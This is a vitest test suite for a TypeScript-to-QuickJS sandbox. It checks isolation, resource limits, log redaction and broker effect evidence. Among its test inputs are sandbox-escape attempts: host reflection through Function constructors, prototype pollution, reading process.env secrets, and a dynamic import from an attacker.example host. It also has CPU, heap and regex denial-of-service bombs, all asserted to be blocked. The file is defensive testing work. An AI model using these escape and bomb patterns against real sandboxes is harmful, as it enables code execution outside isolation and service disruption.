import type {
  EffectEvidence,
  JSONSchema,
  JSONValue,
} from "@scaffold/schema/integrations";
import { describe, expect, it, vi } from "vitest";
import {
  createQuickJSEngineFactory,
  createTypeScriptSandbox,
  formatSandboxLog,
  SANDBOX_LIMITS,
  type SandboxBroker,
  SandboxBrokerError,
  type SandboxBrokerRequest,
  type SandboxBrokerResponse,
  SandboxError,
  type SandboxLog,
} from "../src/integrations/sandbox";
import {
  compileTypeScript,
  type TypeScriptImplementation,
} from "../src/integrations/typescript";
import {
  type CompiledTypeScriptArtifact,
  TYPESCRIPT_LIMITS,
  verifyCompiledTypeScriptArtifact,
} from "../src/integrations/typescript-artifact";

const implementation = (
  source: string,
  modules: Record<string, string> = {},
  entrypoint = "default",
): TypeScriptImplementation => ({
  kind: "typescript",
  source,
  modules,
  entrypoint,
});
async function compiled(
  source: string,
  modules: Record<string, string> = {},
  entrypoint = "default",
) {
  const result = await compileTypeScript(
    implementation(source, modules, entrypoint),
  );
  if (!result.valid) throw new Error(JSON.stringify(result.diagnostics));
  return result.artifact;
}
function broker() {
  let evidence: EffectEvidence = { state: "not_dispatched" };
  const request = vi.fn(
    async (_input: SandboxBrokerRequest): Promise<SandboxBrokerResponse> => {
      evidence = { state: "possible" };
      return {
        status: 200,
        headers: { "content-type": "application/json" },
        body: { login: "isolated-fixture" },
      };
    },
  );
  return {
    request,
    effect: () => evidence,
    redact: (text: string) => text.replaceAll("secret-token", "[REDACTED]"),
  } satisfies SandboxBroker;
}
const engineFactory = createQuickJSEngineFactory();
const sandbox = createTypeScriptSandbox({ engineFactory });
async function invoke(
  artifact: CompiledTypeScriptArtifact,
  provider: SandboxBroker = broker(),
  args: Record<string, JSONValue> = {},
) {
  return sandbox.invoke({
    artifact,
    artifactDigest: artifact.artifactDigest,
    arguments: args,
    deadlineMs: Date.now() + 60000,
    broker: provider,
  });
}

describe("trusted immutable TypeScript compilation", () => {
  it("compiles real TypeScript, relative modules and a compatible pure package closure without executing it", async () => {
    const artifact = await compiled(
      'import {normalize} from "./vendor/pure.ts"; export async function run(input: {name:string},ctx:GuestContext) { const response=await ctx.http.request({accountRequirement:"github",method:"GET",url:"https://api.github.com/user"}); return {name:normalize(input.name),login:response.body.login}; }',
      {
        "vendor/pure.ts":
          'export const version="1.0.0"; export function normalize(value:string):string { return value.trim().toLowerCase(); }',
      },
      "run",
    );
    expect(artifact.compilerVersion).toBe("5.9.3");
    expect(artifact.runtimeVersion).toBe("0.32.0");
    expect(artifact.modules["/entry.ts"]).not.toContain("input:");
    expect(
      await verifyCompiledTypeScriptArtifact(artifact, artifact.artifactDigest),
    ).toBe(true);
    expect(Object.isFrozen(artifact)).toBe(true);
  });
  it.each([
    "export default function run( {",
    'export default function run() { const value:number="not-a-number";return value; }',
    'import {read} from "node:fs"; export default function run(){return read();}',
    'import {value} from "../outside.ts";export default function run(){return value;}',
    'export default async function run(){return import("./later.ts");}',
    "export default function run(){return process.env.SECRET;}",
    'export default function run(){return fetch("https://example.com/");}',
    "declare const secret:string;export default function run(){return secret;}",
    'const value=Function("return 1")();export default function run(){return value;}',
    'import "./side.ts";export default function run(){return 1;}',
    "export default 42;",
  ])(
    "rejects syntax, types, ambient APIs and runtime or escaping dependencies: %s",
    async (source) => {
      const result = await compileTypeScript(
        implementation(source, {
          "side.ts": "export const value=1;",
          "later.ts": "export const value=1;",
        }),
      );
      expect(result.valid).toBe(false);
    },
  );
  it("rejects side effects hidden in an imported dependency without executing them", async () => {
    const result = await compileTypeScript(
      implementation(
        'import {value} from "./side.ts";export default function run(){return value;}',
        {
          "side.ts": "Object.prototype.hostPolluted=true;export const value=1;",
        },
      ),
    );
    expect(result.valid).toBe(false);
    expect(
      (Object.prototype as Record<string, unknown>).hostPolluted,
    ).toBeUndefined();
  });
  it("enforces entry, aggregate source, canonical module and file-count ceilings", async () => {
    expect(
      (
        await compileTypeScript(
          implementation(" ".repeat(TYPESCRIPT_LIMITS.entryBytes + 1)),
        )
      ).valid,
    ).toBe(false);
    const modules = Object.fromEntries(
      Array.from({ length: 32 }, (_, index) => [
        `file${index}.ts`,
        "export const value=1;",
      ]),
    );
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", modules),
        )
      ).valid,
    ).toBe(false);
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", {
            "a.ts": "export const value=1;",
            "./a.ts": "export const value=2;",
          }),
        )
      ).valid,
    ).toBe(false);
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", {
            "huge.ts": " ".repeat(TYPESCRIPT_LIMITS.sourceBytes),
          }),
        )
      ).valid,
    ).toBe(false);
    const allowed = Object.fromEntries(Object.entries(modules).slice(0, 31));
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", allowed),
        )
      ).valid,
    ).toBe(true);
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", {
            "entry.ts": "export const value=1;",
          }),
        )
      ).valid,
    ).toBe(false);
    expect(
      (
        await compileTypeScript(
          implementation("export default function run(){return 1;}", {
            "./entry.ts": "export const value=1;",
          }),
        )
      ).valid,
    ).toBe(false);
  });
  it("enforces the complete immutable compiled-artifact ceiling after escaping", async () => {
    const result = await compileTypeScript(
      implementation(
        'import {quote} from "./large.ts";export default function run(){return quote;}',
        { "large.ts": 'export const quote="' + '\\"'.repeat(300000) + '";' },
      ),
    );
    expect(result.valid).toBe(false);
  });
  it("pins source, artifact and versions; changed stored bytecode cannot be substituted", async () => {
    const artifact = await compiled(
      "export default function run(){return {revision:1};}",
    );
    const next = await compiled(
      "export default function run(){return {revision:2};}",
    );
    expect(artifact.sourceDigest).not.toBe(next.sourceDigest);
    expect(artifact.artifactDigest).not.toBe(next.artifactDigest);
    expect(
      await verifyCompiledTypeScriptArtifact(
        {
          ...artifact,
          modules: {
            ...artifact.modules,
            "/entry.ts": next.modules["/entry.ts"]!,
          },
        },
        artifact.artifactDigest,
      ),
    ).toBe(false);
    expect(
      await verifyCompiledTypeScriptArtifact(
        {
          ...artifact,
          runtimeVersion: "untrusted",
        } as unknown as CompiledTypeScriptArtifact,
        artifact.artifactDigest,
      ),
    ).toBe(false);
  });
  it("bounds diagnostics and never echoes authored literal values", async () => {
    const result = await compileTypeScript(
      implementation(
        'export default function run(){const n:number="PRIVATE-STRING";return n;}',
      ),
    );
    expect(result.valid).toBe(false);
    expect(JSON.stringify(result.diagnostics)).not.toContain("PRIVATE-STRING");
  });
});

describe("real isolated QuickJS execution", () => {
  it("runs authored TypeScript plus a relative pure module with sequential async broker calls", async () => {
    const provider = broker();
    const artifact = await compiled(
      'import {normalize} from "./helper.ts";export default async function run(input:{name:string},ctx:GuestContext){const a=await ctx.http.request({accountRequirement:"github",method:"GET",url:"https://api.github.com/user"});const b=await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});return {name:normalize(input.name),login:a.body.login,status:b.status};}',
      {
        "helper.ts":
          "export function normalize(value:string):string{return value.trim().toLowerCase();}",
      },
    );
    const result = await invoke(artifact, provider, { name: " TEST " });
    expect(result.result.structuredContent).toEqual({
      name: "test",
      login: "isolated-fixture",
      status: 200,
    });
    expect(provider.request).toHaveBeenCalledTimes(2);
    expect(result.effect).toEqual({ state: "possible" });
  });
  it("keeps old pending compiled revisions immutable", async () => {
    const old = await compiled(
      "export default function run(){return {revision:1};}",
    );
    await compiled("export default function run(){return {revision:2};}");
    expect((await invoke(old)).result.structuredContent).toEqual({
      revision: 1,
    });
  });
  it("allocates a fresh runtime/context on each Run and honors the loader memory hook", async () => {
    const engine = await engineFactory();
    expect(engine.getWasmMemory().buffer.byteLength).toBeLessThanOrEqual(
      SANDBOX_LIMITS.wasmMaximumPages * 65536,
    );
    const memory = engine.getWasmMemory();
    expect(() =>
      memory.grow(
        SANDBOX_LIMITS.wasmMaximumPages + 1 - memory.buffer.byteLength / 65536,
      ),
    ).toThrow(RangeError);
    const create = vi.spyOn(engine, "newRuntime");
    const artifact = await compiled(
      'export default function run(){return Function("globalThis.counter=(globalThis.counter||0)+1;return {count:globalThis.counter}")();}',
    );
    expect((await invoke(artifact)).result.structuredContent).toEqual({
      count: 1,
    });
    expect((await invoke(artifact)).result.structuredContent).toEqual({
      count: 1,
    });
    expect(create).toHaveBeenCalledTimes(2);
    create.mockRestore();
  });
  it("host constructors and environment/network names are not available through guest reflection", async () => {
    const artifact = await compiled(
      'export default function run(input:any,ctx:GuestContext){return (ctx.http.request as any).constructor("return {process:typeof process,require:typeof require,fetch:typeof fetch,env:typeof env,bridge:typeof __mcpone_bridge}")();}',
    );
    expect((await invoke(artifact)).result.structuredContent).toEqual({
      process: "undefined",
      require: "undefined",
      fetch: "undefined",
      env: "undefined",
      bridge: "undefined",
    });
  });
  it("guest prototype mutation cannot mutate the host or corrupt captured JSON validation", async () => {
    const artifact = await compiled(
      'export default function run(){return Function("Object.prototype.hostPolluted=true;Object.keys=()=>[];return {safe:1}")();}',
    );
    expect((await invoke(artifact)).result.structuredContent).toEqual({
      safe: 1,
    });
    expect(
      (Object.prototype as Record<string, unknown>).hostPolluted,
    ).toBeUndefined();
  });
  it("runtime constructor-generated module loading cannot escape the compiled closure", async () => {
    const artifact = await compiled(
      'export default function run(){return Function("return import(\\"https://attacker.example/module.js\\")")();}',
    );
    await expect(invoke(artifact)).rejects.toMatchObject({
      code: "execution_failed",
      effect: { state: "not_dispatched" },
    });
  });
  it.each([
    "undefined",
    "Function('return 1')",
    "Symbol('invalid')",
    "Function('return 1n')()",
    "NaN",
    "Infinity",
    'Function("const a={};a.self=a;return a")()',
    'Function("return {get value(){return 1}}")()',
    'Function("return [1,,3]")()',
    '"\\ud800"',
  ])(
    "rejects unsupported JSON output without coercion: %s",
    async (expression) => {
      const artifact = await compiled(
        `export default function run(){return ${expression};}`,
      );
      await expect(invoke(artifact)).rejects.toMatchObject({
        code: "unsupported_result",
        effect: { state: "not_dispatched" },
      });
    },
  );
  it("enforces the whole presented MCP business result cap, not just the raw scalar/object cap", async () => {
    const artifact = await compiled(
      'export default function run(){return {value:"x".repeat(600000)};}',
    );
    await expect(invoke(artifact)).rejects.toBeInstanceOf(SandboxError);
  });
  it("supports scalar JSON and preserves prototype-named input as data", async () => {
    const scalar = await compiled("export default function run(){return 0;}");
    expect((await invoke(scalar)).result).toEqual({
      content: [{ type: "text", text: "0" }],
    });
    const artifact = await compiled(
      'export default function run(input:any){return {value:input["__proto__"].value};}',
    );
    const args = JSON.parse('{"__proto__":{"value":7}}') as Record<
      string,
      JSONValue
    >;
    expect(
      (await invoke(artifact, broker(), args)).result.structuredContent,
    ).toEqual({ value: 7 });
  });
  it.each<{ expression: string; schema: JSONSchema; text: string }>([
    { expression: "7", schema: { type: "integer", minimum: 0 }, text: "7" },
    {
      expression: "[1,2]",
      schema: { type: "array", items: { type: "integer" } },
      text: "[1,2]",
    },
  ])(
    "validates the raw $expression output rather than its JSON text presentation",
    async ({ expression, schema, text }) => {
      const artifact = await compiled(
        `export default function run(){return ${expression};}`,
      );
      const result = await sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        outputSchema: schema,
        deadlineMs: Date.now() + 60000,
        broker: broker(),
      });
      expect(result.result).toEqual({ content: [{ type: "text", text }] });
    },
  );
  it.each<{ expression: string; schema: JSONSchema }>([
    { expression: "7", schema: { type: "string" } },
    {
      expression: "[1,2]",
      schema: { type: "array", items: { type: "string" } },
    },
  ])(
    "rejects mismatched raw $expression output schemas before MCP normalization",
    async ({ expression, schema }) => {
      const artifact = await compiled(
        `export default function run(){return ${expression};}`,
      );
      await expect(
        sandbox.invoke({
          artifact,
          artifactDigest: artifact.artifactDigest,
          arguments: {},
          outputSchema: schema,
          deadlineMs: Date.now() + 60000,
          broker: broker(),
        }),
      ).rejects.toMatchObject({
        code: "unsupported_result",
        effect: { state: "not_dispatched" },
      });
    },
  );
  it("preserves trusted possible effect evidence on raw output schema failure", async () => {
    const provider = broker();
    const artifact = await compiled(
      'export default async function run(input:any,ctx:GuestContext){await ctx.http.request({accountRequirement:null,method:"POST",url:"https://api.github.com/resource",body:{write:true}});return [1];}',
    );
    await expect(
      sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        outputSchema: { type: "array", items: { type: "string" } },
        deadlineMs: Date.now() + 60000,
        broker: provider,
      }),
    ).rejects.toMatchObject({
      code: "unsupported_result",
      effect: { state: "possible" },
    });
  });
  it.each(["", "async "])(
    "classifies an immediate oversized allocation as a memory denial (%s)",
    async (modifier) => {
      const artifact = await compiled(
        `export default ${modifier}function run(){return new Array(100000000).fill("public");}`,
      );
      await expect(invoke(artifact)).rejects.toMatchObject({
        code: "sandbox_limit",
        effect: { state: "not_dispatched" },
      });
    },
  );
  it("does not mistake an ordinary authored error message for engine memory denial", async () => {
    const artifact = await compiled(
      'export default function run(){throw new Error("out of memory");}',
    );
    await expect(invoke(artifact)).rejects.toMatchObject({
      code: "execution_failed",
      effect: { state: "not_dispatched" },
    });
  });
  it.each([
    "while(true){}",
    "const list:any[]=[];while(true)list.push('x'.repeat(65536));",
    "function recurse():any{return recurse();}return recurse();",
    "return new Promise(()=>{while(true){}});",
    "const spin=()=>Promise.resolve().then(spin);return spin();",
    "const spin=()=>Promise.resolve().then(spin);spin();return 1;",
    'return /^(a+)+$/.test("a".repeat(30000)+"!");',
  ])(
    "interrupts CPU, heap, stack, Promise/job and regexp bombs: %s",
    async (body) => {
      const artifact = await compiled(`export default function run(){${body}}`);
      await expect(invoke(artifact)).rejects.toBeInstanceOf(SandboxError);
      // A rejected guest must not poison the following fresh runtime.
      expect(
        (
          await invoke(
            await compiled("export default function run(){return 1;}"),
          )
        ).result.content[0]?.text,
      ).toBe("1");
    },
    10000,
  );
  it("shares the original Run wall deadline across a pending broker request and disposes safely after abort", async () => {
    const provider = broker();
    const pending = Promise.withResolvers<SandboxBrokerResponse>();
    provider.request.mockImplementation(() => pending.promise);
    const artifact = await compiled(
      'export default async function run(input:any,ctx:GuestContext){return await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});}',
    );
    await expect(
      sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 40,
        broker: provider,
      }),
    ).rejects.toMatchObject({ code: "execution_timeout" });
    pending.resolve({ status: 200, headers: {}, body: "late" });
    expect(
      (await invoke(await compiled("export default function run(){return 1;}")))
        .result.content[0]?.text,
    ).toBe("1");
  });
  it("does not permit multiple outstanding or detached broker requests", async () => {
    const provider = broker();
    const concurrent = await compiled(
      'export default async function run(input:any,ctx:GuestContext){const a=ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});const b=ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});return await Promise.all([a,b]);}',
    );
    await expect(invoke(concurrent, provider)).rejects.toBeInstanceOf(
      SandboxError,
    );
    const detached = await compiled(
      'export default function run(input:any,ctx:GuestContext){ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});return {ok:true};}',
    );
    provider.request.mockClear();
    await expect(invoke(detached, provider)).rejects.toMatchObject({
      code: "execution_failed",
    });
    expect(provider.request).not.toHaveBeenCalled();
  });
  it("never uses guest effect claims to erase a trusted possible dispatch", async () => {
    const provider = broker();
    const artifact = await compiled(
      'export default async function run(input:any,ctx:GuestContext){await ctx.http.request({accountRequirement:null,method:"POST",url:"https://api.github.com/resource",body:{write:true}});throw {effect:{state:"verified_no_effect"},secret:"UNSAFE"};}',
    );
    await expect(invoke(artifact, provider)).rejects.toMatchObject({
      code: "execution_failed",
      effect: { state: "possible" },
    });
  });
  it("rejects tampered artifacts before engine or broker dispatch", async () => {
    const provider = broker(),
      engine = vi.fn(engineFactory);
    const guarded = createTypeScriptSandbox({ engineFactory: engine });
    const artifact = await compiled("export default function run(){return 1;}");
    await expect(
      guarded.invoke({
        artifact: {
          ...artifact,
          modules: { "/entry.ts": "export default ()=>2" },
        },
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 60000,
        broker: provider,
      }),
    ).rejects.toMatchObject({ code: "tool_unavailable" });
    expect(engine).not.toHaveBeenCalled();
    expect(provider.request).not.toHaveBeenCalled();
  });
  it("charges cumulative guest execution rather than resetting the CPU budget for Promise jobs", async () => {
    let clock = 0;
    const charged = createTypeScriptSandbox({
      engineFactory,
      now: () => {
        clock += 10;
        return clock;
      },
    });
    const artifact = await compiled(
      "export default async function run(){await Promise.resolve(1);await Promise.resolve(2);return 3;}",
    );
    await expect(
      charged.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 60000,
        broker: broker(),
      }),
    ).rejects.toMatchObject({ code: "sandbox_limit" });
  });
  it("does not charge broker wait time as guest CPU and cancels an explicit shared Run signal", async () => {
    let clock = 0;
    const provider = broker();
    provider.request.mockImplementation(async () => {
      clock += 5000;
      return { status: 200, headers: {}, body: 1 };
    });
    const waiting = createTypeScriptSandbox({
      engineFactory,
      now: () => clock,
    });
    const artifact = await compiled(
      'export default async function run(input:any,ctx:GuestContext){return await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});}',
    );
    expect(
      (
        await waiting.invoke({
          artifact,
          artifactDigest: artifact.artifactDigest,
          arguments: {},
          deadlineMs: Date.now() + 60000,
          broker: provider,
        })
      ).result.structuredContent,
    ).toEqual({ status: 200, headers: {}, body: 1 });
    const abort = new AbortController();
    const pending = Promise.withResolvers<SandboxBrokerResponse>();
    provider.request.mockImplementation(() => pending.promise);
    const invocation = waiting.invoke({
      artifact,
      artifactDigest: artifact.artifactDigest,
      arguments: {},
      deadlineMs: Date.now() + 60000,
      broker: provider,
      signal: abort.signal,
    });
    abort.abort();
    await expect(invocation).rejects.toMatchObject({
      code: "execution_timeout",
    });
    pending.resolve({ status: 200, headers: {}, body: 1 });
  });
  it("stores only bounded redacted console batches before broker dispatch and completion", async () => {
    const provider = broker(),
      logs: SandboxLog[] = [];
    const artifact = await compiled(
      'export default async function run(input:unknown,ctx:GuestContext){console.log("start","secret-token",{nested:"secret-token"});await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});console.info("done");console.warn({note:"secret-token"});console.error("safe error");return 1;}',
    );
    provider.request.mockImplementation(async () => {
      expect(logs).toEqual([
        { level: "log", text: 'start [REDACTED] {"nested":"[REDACTED]"}' },
      ]);
      return { status: 200, headers: {}, body: 1 };
    });
    await sandbox.invoke({
      artifact,
      artifactDigest: artifact.artifactDigest,
      arguments: {},
      deadlineMs: Date.now() + 60000,
      broker: provider,
      onLogs: async (entries) => {
        logs.push(...entries);
      },
    });
    expect(logs.map((entry) => entry.level)).toEqual([
      "log",
      "info",
      "warn",
      "error",
    ]);
    expect(JSON.stringify(logs)).not.toContain("secret-token");
  });
  it("redacts raw nested strings and object keys before JSON escaping", async () => {
    const provider = broker(),
      logs: SandboxLog[] = [];
    const credential = 'quoted"credential\\\\value';
    provider.redact = (text) => text.replaceAll(credential, "[REDACTED]");
    const artifact = await compiled(
      "export default function run(input:{value:string}){console.log(input.value,{[input.value]:input.value});return true;}",
    );
    await sandbox.invoke({
      artifact,
      artifactDigest: artifact.artifactDigest,
      arguments: { value: credential },
      deadlineMs: Date.now() + 60000,
      broker: provider,
      onLogs: async (entries) => {
        logs.push(...entries);
      },
    });
    expect(logs).toEqual([
      { level: "log", text: '[REDACTED] {"[REDACTED]":"[REDACTED]"}' },
    ]);
  });
  it("formats transferred inert log values with the parent-only recursive redactor", async () => {
    const provider = broker(),
      logs: SandboxLog[] = [];
    const credential = 'quoted"credential\\\\value';
    const parentRedact = (text: string) =>
      text.replaceAll(credential, "[REDACTED]");
    provider.redact = vi.fn(() => {
      throw new Error("The private redactor must not enter the native kernel");
    });
    const artifact = await compiled(
      "export default function run(input:{value:string}){console.log(input.value,{[input.value]:input.value});return true;}",
    );
    await sandbox.invoke({
      artifact,
      artifactDigest: artifact.artifactDigest,
      arguments: { value: credential },
      deadlineMs: Date.now() + 60000,
      broker: provider,
      onLogValues: async (entries) => {
        const formatted = entries.map((entry) =>
          formatSandboxLog(entry, parentRedact),
        );
        logs.push(...formatted);
        return formatted.reduce(
          (bytes, entry) =>
            bytes + new TextEncoder().encode(JSON.stringify(entry)).length,
          0,
        );
      },
    });
    expect(provider.redact).not.toHaveBeenCalled();
    expect(logs).toEqual([
      { level: "log", text: '[REDACTED] {"[REDACTED]":"[REDACTED]"}' },
    ]);
  });
  it("permanently denies invalid or oversized parent-reported log output", async () => {
    const artifact = await compiled(
      'export default function run(){console.log("public");return true;}',
    );
    for (const bytes of [-1, Number.NaN, SANDBOX_LIMITS.logBytes + 1])
      await expect(
        sandbox.invoke({
          artifact,
          artifactDigest: artifact.artifactDigest,
          arguments: {},
          deadlineMs: Date.now() + 60000,
          broker: broker(),
          onLogValues: async () => bytes,
        }),
      ).rejects.toMatchObject({
        code: "sandbox_limit",
        effect: { state: "not_dispatched" },
      });
  });
  it("preserves a bounded accepted raw-log prefix on resource denial", async () => {
    const limited = createTypeScriptSandbox({ engineFactory, now: () => 0 });
    const artifact = await compiled(
      "export default function run(input:{values:boolean[]}){for(let i=0;i<30;i++)console.log(input.values);return true;}",
    );
    const sizes: number[] = [];
    await expect(
      limited.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: { values: Array(10000).fill(true) },
        deadlineMs: Date.now() + 60000,
        broker: broker(),
        onLogValues: async (entries) => {
          sizes.push(new TextEncoder().encode(JSON.stringify(entries)).length);
          return 0;
        },
      }),
    ).rejects.toMatchObject({
      code: "sandbox_limit",
      effect: { state: "not_dispatched" },
    });
    expect(sizes.reduce((total, bytes) => total + bytes, 0)).toBeGreaterThan(
      SANDBOX_LIMITS.jsonBytes / 2,
    );
    expect(sizes.every((bytes) => bytes <= SANDBOX_LIMITS.jsonBytes)).toBe(
      true,
    );
  });
  it("captures sanitized logs on guest failure without replacing trusted effect evidence", async () => {
    const provider = broker(),
      logs: SandboxLog[] = [];
    const artifact = await compiled(
      'export default function run(){console.error("secret-token");throw "unsafe";}',
    );
    await expect(
      sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 60000,
        broker: provider,
        onLogs: async (entries) => {
          logs.push(...entries);
        },
      }),
    ).rejects.toMatchObject({
      code: "execution_failed",
      effect: { state: "not_dispatched" },
    });
    expect(logs).toEqual([{ level: "error", text: "[REDACTED]" }]);
  });
  it("bounds aggregate serialized log records including empty logs and does not expose the host Console", async () => {
    const logs: SandboxLog[] = [];
    const artifact = await compiled(
      "export default function run(){for(let i=0;i<4000;i++)console.log();return true;}",
    );
    await expect(
      sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 60000,
        broker: broker(),
        onLogs: async (entries) => {
          logs.push(...entries);
        },
      }),
    ).rejects.toBeInstanceOf(SandboxError);
    expect(
      logs.reduce(
        (bytes, entry) =>
          bytes + new TextEncoder().encode(JSON.stringify(entry)).length,
        0,
      ),
    ).toBeLessThanOrEqual(SANDBOX_LIMITS.logBytes);
    expect(
      (
        await compileTypeScript(
          implementation(
            "export default function run(){console.trace();return true;}",
          ),
        )
      ).valid,
    ).toBe(false);
    const reflected = await compiled(
      `export default function run(){return Function("return console.log.constructor('return {process:typeof process,bridge:typeof __mcpone_log}')()")();}`,
    );
    expect((await invoke(reflected)).result.structuredContent).toEqual({
      process: "undefined",
      bridge: "undefined",
    });
  });
  it.each([
    "broker_forbidden",
    "account_disabled",
    "account_identity_changed",
    "account_scope_required",
  ])(
    "preserves trusted %s broker denial and prevents guest suppression or reinterpretation",
    async (code) => {
      const provider = broker(),
        logs: SandboxLog[] = [];
      provider.request.mockRejectedValue(
        Object.assign(new Error("Safe native broker denial"), { code }),
      );
      const artifact = await compiled(
        'export default async function run(input:unknown,ctx:GuestContext){try{await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});}catch{console.log("caught");throw {code:"upstream_unavailable",effect:{state:"verified_no_effect"}};}return {suppressed:true};}',
      );
      const invocation = sandbox.invoke({
        artifact,
        artifactDigest: artifact.artifactDigest,
        arguments: {},
        deadlineMs: Date.now() + 60000,
        broker: provider,
        onLogs: async (entries) => {
          logs.push(...entries);
        },
      });
      await expect(invocation).rejects.toMatchObject({
        code,
        effect: { state: "not_dispatched" },
        retryable: false,
      });
      await expect(invocation).rejects.toBeInstanceOf(SandboxBrokerError);
      expect(logs).toEqual([]);
      expect(provider.request).toHaveBeenCalledTimes(1);
    },
  );
  it("does not recognize forged guest broker error codes as native failure evidence", async () => {
    const artifact = await compiled(
      'export default function run(){throw {code:"broker_forbidden",effect:{state:"completed"},retryable:true};}',
    );
    await expect(invoke(artifact)).rejects.toMatchObject({
      code: "execution_failed",
      effect: { state: "not_dispatched" },
    });
  });
  it("preserves trusted possible effect after a real post-dispatch broker rejection", async () => {
    const provider = broker();
    provider.effect = () => ({ state: "possible" });
    provider.request.mockRejectedValue(
      Object.assign(new Error("Safe native result error"), {
        code: "unsupported_result",
      }),
    );
    const artifact = await compiled(
      'export default async function run(input:unknown,ctx:GuestContext){try{return await ctx.http.request({accountRequirement:null,method:"POST",url:"https://api.github.com/resource",body:{write:true}});}catch{return {effect:{state:"verified_no_effect"}};}}',
    );
    await expect(invoke(artifact, provider)).rejects.toMatchObject({
      code: "unsupported_result",
      effect: { state: "possible" },
    });
  });
  it.each([true, false])(
    "carries only the actual native broker retry witness: %s",
    async (retryable) => {
      const provider = broker();
      provider.effect = () => ({
        state: "verified_no_effect",
        reason: "The trusted transport proved no business bytes were sent",
      });
      provider.request.mockRejectedValue(
        Object.assign(new Error("Safe native connection error"), {
          code: "upstream_unavailable",
          retryable,
        }),
      );
      const artifact = await compiled(
        'export default async function run(input:unknown,ctx:GuestContext){return await ctx.http.request({accountRequirement:null,method:"GET",url:"https://api.github.com/zen"});}',
      );
      await expect(invoke(artifact, provider)).rejects.toMatchObject({
        code: "upstream_unavailable",
        effect: { state: "verified_no_effect" },
        retryable,
      });
    },
  );
});
